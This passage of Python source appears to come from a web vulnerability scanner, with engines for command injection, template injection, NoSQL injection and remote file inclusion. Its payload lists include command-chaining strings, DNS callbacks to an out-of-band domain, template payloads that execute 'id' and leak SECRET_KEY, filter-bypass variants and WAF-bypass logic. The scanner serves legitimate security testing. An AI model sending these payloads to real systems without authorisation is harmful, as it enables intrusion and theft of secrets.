        (";ping -c 5 127.0.0.1", "ping测试"),
        ("|ping -c 5 127.0.0.1", "ping管道"),
        (";timeout /t 5", "Windows timeout"),
        ("&timeout /t 5", "Windows timeout&"),
        (";nslookup {{interactsh-domain}}", "DNS外带-nslookup"),
        ("|nslookup {{interactsh-domain}}", "DNS外带-管道"),
        (";dig {{interactsh-domain}}", "DNS外带-dig"),
    ]

    # 注意：只保留"强特征"——正常网页几乎不可能出现的命令输出特征。
    # 旧版包含 'bin'/'sys'/'man'/'total'/'USER'/'COMMAND'/'tcp' 等泛化词，
    # 曾导致 httpbin.org 主页（含 "httpbin" 字样）被误报为命令注入。
    CMD_OUTPUT_INDICATORS = [
        'uid=', 'gid=', 'groups=',
        'root:x:0:0:', 'nobody:x:', 'daemon:x:',
        'Linux version', 'GNU/Linux',
        'Ubuntu ', 'Debian ', 'CentOS ', 'Red Hat',
        'eth0', 'inet addr',
        'Mem:', 'Swap:',
        'LISTEN', 'ESTABLISHED',
        'Filesystem', 'Mounted on',
        'www-data',
        'Volume Serial Number', 'Directory of',
        'Active code page',
        'Host Name', 'OS Name', 'OS Version',
        'System Type', 'Processor(s)',
        'Total Physical Memory',
        'Available Physical Memory',
        'command not found', 'is not recognized',
        'permission denied',
        'cannot execute', 'failed to execute',
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if normal_resp is None or not isinstance(normal_resp, tuple) or len(normal_resp) < 2:
            try:
                resp = await async_get(url, session=session, timeout=5, no_retry=True)
                if isinstance(resp, tuple) and len(resp) >= 2:
                    normal_resp = (resp[0], resp[1] if resp[1] else "", resp[2] if len(resp) > 2 else {})
                else:
                    return None
            except BaseException:
                return None

        if isinstance(normal_resp, tuple):
            _normal_status, _normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, _normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)
        interactsh_domain = kwargs.get('interactsh_domain', None)
        timeout = getattr(settings, 'timeout', 30)

        if not await self._is_cmd_param(url, param, parsed_query, session):
            self.log_debug(f"参数 {param} 不像命令参数，跳过 CMDI 检测")
            return None

        payloads = self.reorder_payloads_by_param(param)

        if interactsh_domain:
            processed_payloads = []
            for payload, desc in payloads:
                if '{{interactsh-domain}}' in payload:
                    new_payload = payload.replace('{{interactsh-domain}}', interactsh_domain)
                    processed_payloads.append((new_payload, f"{desc}(外带)"))
                else:
                    processed_payloads.append((payload, desc))
            payloads = processed_payloads

        if is_static:
            payloads = payloads[:8]

        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            is_time_based = any(kw in payload.lower() for kw in ['sleep', 'ping -c', 'timeout /t'])
            req_timeout = 20 if is_time_based else timeout

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                start_time = time.time()
                attack_resp = await async_get(attack_url, session=session, timeout=req_timeout, no_retry=is_time_based)
                elapsed = time.time() - start_time

                if isinstance(attack_resp, tuple):
                    attack_status, attack_text = attack_resp[0], attack_resp[1]
                else:
                    attack_status, attack_text = attack_resp.status, await attack_resp.text()

                # 准确率修复：服务器错误/限流/连接失败与 payload 无关，跳过
                if attack_status in (0, 429) or attack_status >= 500:
                    self.log_debug(f"攻击响应不稳定 (状态码 {attack_status})，跳过 payload: {payload[:30]}")
                    continue

                if attack_status in (403, 406) and len(attack_text) < 100:
                    self.log_debug(f"检测到 WAF 阻断 (状态码 {attack_status})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        "unknown", normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                waf_type = await self.detect_waf(attack_text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                if self._has_cmd_output(attack_text, _normal_text or "", payload):
                    evidence = self._extract_cmd_output(attack_text)
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'命令注入-CMD执行({desc})',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f"检测到命令输出: {evidence}",
                        'elapsed': elapsed,
                        'cmd_exec': True
                    }

                if is_time_based and elapsed > 4.0:
                    verified, slow_times, fast = await self._verify_time_based_cmdi(
                        payload, url, param, parsed_query, session, compliant
                    )
                    if verified:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'命令注入-时间盲注({desc})',
                            'severity': 'High',
                            'ai_verdict': '高',
                            'confidence': 'high',
                            'evidence': (
                                f"延时 payload 两次平均 {sum(slow_times)/2:.1f}s，"
                                f"sleep 0 对照 {fast:.1f}s，差异显著（A/B 复核通过）"
                            ),
                            'elapsed': elapsed,
                            'time_based': True,
                            'time_verified': True
                        }
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'命令注入-时间盲注疑似({desc})',
                        'severity': 'Medium',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': (
                            f"单次延迟 {elapsed:.1f}s 但 A/B 复核未通过"
                            f"（延时 {slow_times} / 对照 {fast:.1f}s），可能为网络抖动"
                        ),
                        'elapsed': elapsed,
                        'time_based': True
                    }

                # 准确率修复：先剥离被回显的 payload 本身再比对
                # （回显型端点 /get /anything 会把 payload 原样返回，造成假差异）
                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (attack_status, self.strip_payload_reflection(attack_text, payload), {}),
                    threshold=0.2
                )
                if has_diff:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'命令注入-疑似({desc})',
                        'severity': 'Medium',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio,
                        'elapsed': elapsed
                    }

            except asyncio.TimeoutError:
                if is_time_based:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'命令注入-时间盲注疑似({desc})',
                        'severity': 'Medium',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f"请求超时 ({req_timeout}s)，可能触发 sleep 也可能为网络慢，未通过 A/B 复核",
                        'time_based': True,
                        'timeout': True
                    }
            except Exception as e:
                self.log_debug(f"CMDI 检测异常 {param}: {e}")

        return None

    async def _verify_time_based_cmdi(
        self,
        payload: str,
        url: str,
        param: str,
        parsed_query: str,
        session,
        compliant: bool,
    ):
        """A5 时间盲注 A/B 复核：延时 payload 连续两次都慢、且 sleep 0 对照明显更快，
        才认定是真实命令延时（time_verified），排除网络抖动导致的单次超时误报。
        返回 (是否实锤, 两次延时秒数列表, 对照秒数)。
        """
        import time as _time

        slow_times = []
        for _ in range(2):
            if compliant:
                await asyncio.sleep(0.3)
            t0 = _time.time()
            try:
                await async_get(
                    build_attack_url(url, param, payload, parsed_query),
                    session=session, timeout=20, no_retry=True
                )
            except Exception:
                pass  # 超时也计入"慢"
            slow_times.append(_time.time() - t0)

        zero_payload = re.sub(r'(?i)sleep\s+\d+', 'sleep 0', payload)
        if zero_payload == payload:
            zero_payload = re.sub(r'(?i)timeout\s*/t\s+\d+', 'timeout /t 0', payload)
        if compliant:
            await asyncio.sleep(0.3)
        t0 = _time.time()
        try:
            await async_get(
                build_attack_url(url, param, zero_payload, parsed_query),
                session=session, timeout=10, no_retry=True
            )
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        fast = _time.time() - t0

        verified = (
            all(s > 4 for s in slow_times)
            and fast < 3
            and (sum(slow_times) / 2 - fast) > 3
        )
        return verified, slow_times, fast

    async def _is_cmd_param(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session
    ) -> bool:
        cmd_indicators = ['cmd', 'exec', 'command', 'run', 'ping', 'traceroute', 'dig', 'nslookup', 'host', 'shell']
        if any(ind in param.lower() for ind in cmd_indicators):
            return True

        try:
            test_payload = ";echo test"
            test_url = build_attack_url(url, param, test_payload, parsed_query)
            resp = await async_get(test_url, session=session, timeout=5, no_retry=True)

            if isinstance(resp, tuple):
                text = resp[1]
            else:
                text = await resp.text()

            if "test" in text:
                return True
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return True

    def _has_cmd_output(self, text: str, normal_text: str = "", payload: str = "") -> bool:
        """判断响应中是否出现命令输出特征。

        准确率修复（两层防误报）：
        1. 基线对比：indicator 若在正常响应中已存在（如 "httpbin" 含 bin），不算命令输出；
        2. 回显排除：indicator 若出现在被回显的 payload 本身中（参数反射型目标），不算。
        """
        for indicator in self.CMD_OUTPUT_INDICATORS:
            if indicator not in text:
                continue
            if normal_text and indicator in normal_text:
                continue
            if payload and indicator in payload:
                continue
            return True
        return False

    def _extract_cmd_output(self, text: str) -> str:
        patterns = [
            r'uid=\d+\([^)]+\)',
            r'root:.*?:0:0:',
            r'Linux version [^,]+',
            r'Windows NT [\d.]+',
            r'PID\s+USER\s+',
            r'tcp\s+\d+\s+\d+',
            r'Filesystem\s+',
            r'Mem:\s+\d+',
            r'Host Name\s*:\s*[^\n]+',
            r'OS Name\s*:\s*[^\n]+',
        ]

        for pattern in patterns:
            match = re.search(pattern, text, re.I)
            if match:
                return match.group()[:100]

        lines = text.split('\n')
        for line in lines:
            for indicator in self.CMD_OUTPUT_INDICATORS:
                if indicator in line:
                    return line[:100]

        return text[:200]


# ============================================================
# SSTIEngine
# ============================================================
class SSTIEngine(BaseEngine):
    """SSTI 模板注入检测引擎"""

    name = "ssti"
    description = "SSTI 模板注入检测引擎"

    priority_params = [
        "name", "user", "template", "page", "view", "render",
        "include", "extend", "block", "content", "body",
        "title", "heading", "message", "greeting"
    ]

    ENGINE_SIGNATURES = {
        'Jinja2': ['{{', '{%', 'jinja', 'flask', 'django'],
        'Django': ['{{', '{%', 'django', 'csrf_token'],
        'Twig': ['{{', '{%', 'twig', 'symfony'],
        'Velocity': ['$!', '#set', 'velocity'],
        'Freemarker': ['${', '<#', 'freemarker'],
        'Smarty': ['{$', '{smarty', 'Smarty'],
        'Handlebars': ['{{', 'handlebars'],
        'Mustache': ['{{', 'mustache'],
        'EJS': ['<%=', 'ejs'],
        'Pug': ['#{', 'pug', 'jade'],
        'Nunjucks': ['{{', 'nunjucks'],
        'Thymeleaf': ['${', 'th:', 'thymeleaf'],
        'ERB': ['<%=', 'erb', 'rails'],
        'ASP': ['<%=', 'asp', 'aspx'],
        'Jade': ['#{', 'jade', 'pug'],
        'Mako': ['<%', 'mako', 'template'],
        'Pebble': ['pebble', '{{'],
    }

    L1_PAYLOADS = [
        ("{{7*7}}", "49", "Jinja2/Twig/Nunjucks"),
        ("${7*7}", "49", "Freemarker/Velocity"),
        ("{{7*'7'}}", "7777777", "Jinja2字符串乘法"),
        ("<%= 7*7 %>", "49", "ERB/ASP"),
        ("#{7*7}", "49", "Thymeleaf/Handlebars"),
        ("{{ 7 * 7 }}", "49", "Jinja2带空格"),
        ("{$smarty.now}", "\\d+", "Smarty时间戳"),
        ("{7*7}", "49", "Smarty算术"),
        ("@(7*7)", "49", "Velocity算术"),
        ('${"7"*7}', "7777777", "Mako字符串乘法"),
    ]

    # A4 二次复核对：用不同算式（1337*2→2674）排除“页面本就含该数字”的巧合误报。
    # 按 payload 前缀匹配对应语法形式；顺序敏感（"{{" 必须在 "{" 之前）。
    L1_VERIFY_PAIRS = [
        ("{{", "{{1337*2}}", "2674"),
        ("${", "${1337*2}", "2674"),
        ("<%=", "<%= 1337*2 %>", "2674"),
        ("#{", "#{1337*2}", "2674"),
        ("@(", "@(1337*2)", "2674"),
        ("{", "{1337*2}", "2674"),
    ]

    L2_PAYLOADS = [
        ("{{config}}", "SECRET_KEY", "Flask config"),
        ("{{settings}}", "SECRET_KEY", "Django settings"),
        ("{{app.config}}", "SECRET_KEY", "Flask app.config"),
        ("{{request.application}}", "config", "Flask request"),
        ("{{self.__dict__}}", "_TemplateReference__context", "Jinja2 self"),
        ("{{get_flashed_messages.__globals__}}", "__builtins__", "Flask globals"),
        ("{{url_for.__globals__}}", "current_app", "Flask url_for"),
        ("{{config.items()}}", "SECRET_KEY", "Flask config items"),
        ("{$smarty.version}", "Smarty", "Smarty版本"),
        ("${.lang}", "en", "Freemarker语言"),
        ("${.data_model}", "root", "Freemarker数据模型"),
    ]

    L3_PAYLOADS = [
        # --- Jinja2 / Flask / Django (Python) ---
        ("{{ cycler.__init__.__globals__.os.popen('id').read() }}", "uid=", "Jinja2 RCE(cycler)"),
        ("{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", "uid=", "Jinja2 RCE(config)"),
        ("{{ ''.__class__.__mro__[1].__subclasses__() }}", "subprocess", "Jinja2 RCE(subclasses)"),
        ("{{ request.application.__self__._get_data_for_json.__globals__['json'].loads }}", "json", "Flask RCE"),
        ("{{ url_for.__globals__.os.popen('id').read() }}", "uid=", "Flask url_for RCE"),
        # 沙箱/黑名单多态绕过：属性名 hex 转义绕过 __globals__ 词过滤（A3 多态变形）
        ("{{ request|attr('application')|attr('\x5f\x5fglobal\x5f\x5f')|attr('os')|attr('popen')('id')|attr('read')() }}", "uid=", "Jinja2 RCE(hex-attr bypass)"),
        ("{{ lipsum.__globals__['os'].popen('id').read() }}", "uid=", "Jinja2 RCE(lipsum)"),
        # --- Twig (PHP / Symfony) ---
        ("{{ ['id']|filter('system') }}", "uid=", "Twig RCE(filter system)"),
        ("{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}", "uid=", "Twig RCE(registerUndefinedFilterCallback)"),
        # --- Mako (Python) ---
        ("${__import__('os').popen('id').read()}", "uid=", "Mako RCE"),
        ("<% import os; print(os.popen('id').read()) %>", "uid=", "Mako RCE(code-block)"),
        # --- ERB / Ruby ---
        ("<%= `id` %>", "uid=", "ERB/Ruby RCE"),
        # --- Smarty (PHP) ---
        ("{php}system('id');{/php}", "uid=", "Smarty RCE(php tag)"),
        # --- Freemarker (Java) ---
        ("${" + '"'.join(["new", "java.lang.ProcessBuilder('id').start()"]) + "}", "ProcessBuilder", "Freemarker RCE"),
        ("${" + '"'.join(["new", "java.lang.Runtime.getRuntime().exec('id')"]) + "}", "Runtime", "Freemarker RCE"),
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if isinstance(normal_resp, tuple):
            _normal_status, normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        kwargs.get('is_static', False)

        detected_engines = self._detect_template_engine(normal_text)
        if detected_engines:
            self.log_info(f"检测到模板引擎: {', '.join(detected_engines)}")

        l1_result = await self._check_l1(
            url, param, normal_resp, normal_text, parsed_query, session, compliant
        )
        if l1_result:
            l1_result['stage'] = 'L1'

        l2_result = await self._check_l2(
            url, param, normal_resp, parsed_query, session, compliant
        )
        if l2_result:
            l2_result['stage'] = 'L2'

        # RCE 升级：仅当 L1/L2 已确认注入 或 正常响应已暴露引擎签名时，才尝试 RCE 实锤，
        # 避免对任意参数盲打 RCE payload（A3：SSTI RCE 实锤与严重度升级）。
        injection_suspected = bool(l1_result or l2_result or detected_engines)
        if injection_suspected:
            l3_result = await self._check_l3(
                url, param, normal_resp, parsed_query, session, compliant
            )
            if l3_result:
                l3_result['stage'] = 'L3'
                l3_result['rce_confirmed'] = True
                l3_result['ai_verdict'] = '高'
                l3_result['confidence'] = 'high'
                return l3_result

        if l1_result:
            return l1_result
        if l2_result:
            return l2_result
        return None

    async def _check_l1(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        normal_text: str,
        parsed_query: str,
        session,
        compliant: bool
    ) -> Optional[Dict]:
        for payload, expected, engine in self.L1_PAYLOADS:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                status, text, _ = await _parse_response(resp)

                if status in (403, 406) and len(text) < 100:
                    self.log_debug(f"检测到 WAF 阻断 (状态码 {status})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        "unknown", normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                waf_type = await self.detect_waf(text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                if expected in text and len(text) < 10000:
                    is_in_template_context = self._is_in_template_context(text, payload)
                    is_in_normal_response = expected in normal_text
                    is_in_html_attr = self._is_in_html_attribute(text, expected)

                    if is_in_template_context and not is_in_html_attr:
                        calc_verified = await self._verify_calc(
                            payload, url, param, parsed_query, session, compliant
                        )
                        evidence = (
                            f"响应中出现 '{expected}'（{payload} 的计算结果），且出现在模板上下文中"
                        )
                        if calc_verified:
                            evidence += "；二次复核 {{1337*2}}→2674 同样命中，排除巧合"
                        else:
                            evidence += "；二次复核未命中（可能被过滤或单次巧合），建议人工确认"
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'SSTI-L1算术检测({engine})',
                            'ai_verdict': '高' if calc_verified else '中',
                            'confidence': 'high' if calc_verified else 'medium',
                            'evidence': evidence,
                            'diff_ratio': 0.5,
                            'engine': engine,
                            'context_verified': True,
                            'calc_verified': calc_verified,
                            'template_engine': engine,
                        }
                    elif not is_in_normal_response and len(text) < 500:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'SSTI-L1算术检测({engine})',
                            'ai_verdict': '中',
                            'confidence': 'medium',
                            'evidence': f"响应中出现 '{expected}'，原响应不包含此值",
                            'diff_ratio': 0.5,
                            'engine': engine,
                            'context_verified': True
                        }
                    else:
                        logger.debug(f"⏭️ SSTI L1 疑似误报: {expected} 在原始响应中已存在或出现在HTML属性中")
                        continue

            except Exception as e:
                self.log_debug(f"SSTI L1 检测异常: {e}")

        return None

    async def _verify_calc(
        self,
        payload: str,
        url: str,
        param: str,
        parsed_query: str,
        session,
        compliant: bool,
    ) -> bool:
        """A4 二次复核：用同一语法的不同算式（1337*2→2674）再次请求，
        只有结果同样命中才认定是真实模板计算，排除“页面本就含 49”的巧合。
        """
        verify_payload, verify_expected = self._verify_pair(payload)
        if not verify_payload:
            return False
        if compliant:
            await asyncio.sleep(0.3)
        attack_url = build_attack_url(url, param, verify_payload, parsed_query)
        try:
            resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
            _status, text, _ = await _parse_response(resp)
            return bool(verify_expected in text and len(text) < 10000)
        except Exception as e:
            self.log_debug(f"SSTI 二次复核异常: {e}")
            return False

    def _verify_pair(self, payload: str):
        """根据 payload 前缀返回同语法的复核算式与期望结果。"""
        for prefix, vp, ve in self.L1_VERIFY_PAIRS:
            if payload.startswith(prefix):
                return vp, ve
        return None, None

    def _is_in_template_context(self, text: str, payload: str) -> bool:
        context_patterns = [
            r'\{\{.*?' + re.escape(payload) + r'.*?\}\}',
            r'\{%.*?' + re.escape(payload) + r'.*?%\}',
            r'\$\{.*?' + re.escape(payload) + r'.*?\}',
            r'<%=.*?' + re.escape(payload) + r'.*?%>',
        ]
        for pattern in context_patterns:
            if re.search(pattern, text, re.DOTALL):
                return True
        return False

    def _is_in_html_attribute(self, text: str, expected: str) -> bool:
        attr_patterns = [
            r'(?:class|id|data-[a-zA-Z-]+|style|src|href)\s*=\s*["\'][^"\']*' + re.escape(expected) + r'[^"\']*["\']',
            r'<[a-zA-Z]+[^>]*' + re.escape(expected) + r'[^>]*>',
        ]
        for pattern in attr_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    async def _check_l2(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        compliant: bool
    ) -> Optional[Dict]:
        normal_text = normal_resp[1] if isinstance(normal_resp, tuple) else await normal_resp.text()

        for payload, expected, engine in self.L2_PAYLOADS:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                status, text, _ = await _parse_response(resp)

                if expected in text and len(text) < 10000:
                    if expected not in normal_text:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'SSTI-L2配置泄露({engine})',
                            'ai_verdict': '高',
                            'confidence': 'high',
                            'evidence': f"响应中包含配置信息: {self._extract_config_evidence(text, expected)}",
                            'diff_ratio': 0.5,
                            'engine': engine
                        }
                    else:
                        logger.debug(f"⏭️ SSTI L2 疑似误报: {expected} 在原始响应中已存在")

            except Exception as e:
                self.log_debug(f"SSTI L2 检测异常: {e}")

        return None

    async def _check_l3(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        compliant: bool
    ) -> Optional[Dict]:
        for payload, expected, desc in self.L3_PAYLOADS:
            if compliant:
                await asyncio.sleep(0.5)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                status, text, _ = await _parse_response(resp)

                if expected in text:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'SSTI-L3 RCE验证({desc})',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f"命令执行成功，响应包含: {self._extract_cmd_evidence(text, expected)}",
                        'diff_ratio': 0.5,
                        'rce_confirmed': True
                    }

            except Exception as e:
                self.log_debug(f"SSTI L3 检测异常: {e}")

        return None

    def _detect_template_engine(self, text: str) -> List[str]:
        detected = []
        text_lower = text.lower()
        for engine, signatures in self.ENGINE_SIGNATURES.items():
            for sig in signatures:
                if sig in text_lower:
                    detected.append(engine)
                    break
        return detected

    def _extract_config_evidence(self, text: str, expected: str) -> str:
        lines = text.split('\n')
        for line in lines:
            if expected in line:
                return line[:200]
        for line in lines:
            if 'SECRET' in line or 'KEY' in line or 'PASSWORD' in line:
                return line[:200]
        return text[:200]

    def _extract_cmd_evidence(self, text: str, expected: str) -> str:
        lines = text.split('\n')
        for line in lines:
            if expected in line:
                return line[:200]
        cmd_indicators = ['uid=', 'root:', 'nobody:', 'www-data', 'daemon']
        for line in lines:
            for indicator in cmd_indicators:
                if indicator in line:
                    return line[:200]
        return text[:200]


# ============================================================
# NoSQLEngine
# ============================================================
class NoSQLEngine(BaseEngine):
    """NoSQL 注入检测引擎"""

    name = "nosql"
    description = "NoSQL 注入检测引擎"

    priority_params = [
        "id", "user", "uid", "email", "username", "login",
        "search", "query", "filter", "where", "sort", "order",
        "token", "api_key", "session", "cookie"
    ]

    payloads = [
        ('{"$ne": ""}', "MongoDB $ne(不等于)"),
        ('{"$gt": ""}', "MongoDB $gt(大于)"),
        ('{"$gte": ""}', "MongoDB $gte(大于等于)"),
        ('{"$lt": ""}', "MongoDB $lt(小于)"),
        ('{"$lte": ""}', "MongoDB $lte(小于等于)"),
        ('{"$regex": ".*"}', "MongoDB $regex(正则)"),
        ('{"$regex": "^.*$"}', "MongoDB $regex(全匹配)"),
        ('{"$in": ["admin"]}', "MongoDB $in(包含)"),
        ('{"$nin": [""]}', "MongoDB $nin(不包含)"),
        ('{"$where": "1==1"}', "MongoDB $where(JS表达式)"),
        ('{"$where": "this.role == \"admin\""}', "MongoDB $where(JS注入)"),
        ('{"$or": [{"$ne": ""}]}', "MongoDB $or(或)"),
        ('{"$and": [{"$ne": ""}]}', "MongoDB $and(与)"),
        ('{"$exists": true}', "MongoDB $exists(存在)"),
        ('{"$type": 2}', "MongoDB $type(类型)"),
        ('["$ne"]', "数组$ne"),
        ('["$gt"]', "数组$gt"),
        ('["$regex"]', "数组$regex"),
        ('["$where"]', "数组$where"),
        ('$ne=', "$ne=格式"),
        ('$gt=', "$gt=格式"),
        ('$regex=', "$regex=格式"),
        ('$where=', "$where=格式"),
        ('{"username": {"$ne": ""}}', "JSON $ne"),
        ('{"password": {"$ne": ""}}', "JSON $ne password"),
        ('{"username": {"$regex": ".*"}}', "JSON $regex"),
        ('{"$or": [{"username": ""}, {"username": {"$ne": ""}}]}', "JSON $or"),
        ('{"$ne": null}', "$ne null"),
        ('{"$ne": undefined}', "$ne undefined"),
        ('{"$ne": []}', "$ne 空数组"),
        ('{"$ne": {}}', "$ne 空对象"),
        ('{"$gt": null}', "$gt null"),
        ("' OR '1'='1", "SQL风格-OR"),
        ("' OR 1=1--", "SQL风格-OR注释"),
        ("' || '1'=='1", "SQL风格-OR字符串"),
        ('" OR "1"="1', "SQL风格-双引号"),
    ]

    NOSQL_ERROR_INDICATORS = [
        'mongodb', 'mongo', 'cast error', 'unknown operator',
        'duplicate key', 'cannot apply', 'bad query',
        'uncaught exception', 'MongoError', 'MongoDB',
        '$ne', '$gt', '$regex', '$where', '$or', '$and',
        'Cannot read property', 'is not defined',
        'TypeError', 'ReferenceError', 'SyntaxError',
        'invalid operator', 'not a valid operator',
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if isinstance(normal_resp, tuple):
            _normal_status, _normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, _normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)

        if not await self._is_nosql_target(url, session):
            self.log_debug(f"目标 {url} 不像 NoSQL 接口，跳过检测")
            return None

        payloads = self.reorder_payloads_by_param(param)
        if is_static:
            payloads = payloads[:8]

        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                attack_resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)

                if isinstance(attack_resp, tuple):
                    attack_status, attack_text = attack_resp[0], attack_resp[1]
                else:
                    attack_status, attack_text = attack_resp.status, await attack_resp.text()

                # 准确率修复：服务器错误/限流/连接失败与 payload 无关，跳过
                if attack_status in (0, 429) or attack_status >= 500:
                    self.log_debug(f"攻击响应不稳定 (状态码 {attack_status})，跳过 payload: {payload[:30]}")
                    continue

                if attack_status in (403, 406) and len(attack_text) < 100:
                    self.log_debug(f"检测到 WAF 阻断 (状态码 {attack_status})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        "unknown", normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                waf_type = await self.detect_waf(attack_text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                if self._has_nosql_error(attack_text):
                    evidence = self._extract_nosql_error(attack_text)
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'NoSQL注入({desc})',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': evidence,
                        'diff_ratio': 0.5
                    }

                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (attack_status, self.strip_payload_reflection(attack_text, payload), {}),
                    threshold=0.15
                )
                if has_diff:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'NoSQL注入-疑似({desc})',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio
                    }

            except Exception as e:
                self.log_debug(f"NoSQL 检测异常 {param}: {e}")

        return None

    async def _is_nosql_target(self, url: str, session) -> bool:
        url_lower = url.lower()
        if 'graphql' in url_lower:
            return False

        try:
            resp = await async_get(url, session=session, timeout=5, no_retry=True)
            if isinstance(resp, tuple):
                headers = resp[2]
            else:
                headers = resp.headers

            content_type = headers.get('Content-Type', '')
            if 'json' in content_type.lower() or 'graphql' in content_type.lower():
                return True
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return True

    def _has_nosql_error(self, text: str) -> bool:
        text_lower = text.lower()
        for indicator in self.NOSQL_ERROR_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_nosql_error(self, text: str) -> str:
        lines = text.split('\n')
        for line in lines:
            for indicator in self.NOSQL_ERROR_INDICATORS:
                if indicator.lower() in line.lower():
                    return line[:200]
        return text[:200]


# ============================================================
# RFIEngine（远程文件包含）
# ============================================================
class RFIEngine(BaseEngine):
    """远程文件包含（RFI）检测引擎

    检测策略（证据优先，低误报）：
    1. 注入指向不存在域名的远程 URL，若后端尝试解析/包含远程资源，
       响应中会出现 PHP/JSP 的网络错误签名（getaddrinfo failed 等）；
    2. 辅以 A/B 响应差异校验（has_response_diff）确认。
    """

    name = "rfi"
    description = "远程文件包含（RFI）检测引擎"

    priority_params = [
        "page", "file", "path", "url", "include", "require",
        "module", "template", "view", "doc", "load", "lang",
        "content", "tpl", "src", "dir", "document",
    ]

    payloads = [
        ("http://rfi-probe-nonexistent-7f3a.invalid/x.php", "远程URL探测(不存在域名)"),
        ("//rfi-probe-nonexistent-7f3a.invalid/x.php", "协议相对URL探测"),
        ("http://rfi-probe-nonexistent-7f3a.invalid/x.txt", "远程TXT探测"),
        ("http://example.com/nonexistent-rfi-probe.php", "真实域名不存在路径"),
        ("https://rfi-probe-nonexistent-7f3a.invalid/x.php", "HTTPS远程URL探测"),
    ]

